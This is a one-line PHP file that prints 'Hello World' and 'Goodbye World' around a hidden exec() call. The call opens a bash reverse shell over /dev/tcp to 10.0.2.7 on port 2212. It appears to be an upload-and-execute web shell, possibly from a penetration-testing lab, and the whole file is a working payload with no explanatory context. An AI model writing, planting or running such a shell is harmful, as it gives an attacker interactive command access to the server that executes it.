<?php echo 'Hello World';exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.2.7/2212 0>&1'");echo 'Goodbye World';?>
